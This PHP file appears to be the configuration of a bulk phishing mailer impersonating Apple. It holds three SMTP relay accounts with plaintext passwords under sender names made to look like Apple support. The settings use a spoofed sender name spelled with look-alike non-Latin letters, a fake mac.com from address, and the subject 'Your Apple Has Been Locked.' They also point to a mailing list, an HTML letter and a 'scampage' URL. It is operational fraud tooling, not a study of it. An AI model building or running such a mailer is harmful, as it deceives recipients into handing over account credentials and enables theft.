<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "apple-store-support-member.customerinformationsaccsupport@alstarprojec.com",
        "password" => "dilascbk1234"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "Confirmation-your-activitysupport@alstarprojec.com",
        "password" => "dilascbk1234"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "wibupsikopat-confirmationcheckoutsupport@alstarprojec.com",
        "password" => "dilascbk1234"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "Apple Rеmіndег",
    "frommail"       => "noreply@unverified.logo.mac.com",
    "subject"        => $date . " Your Apple Has Been Locked.",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://itrade.sbbs.com.vn/upload5warn/rd.html"],
];
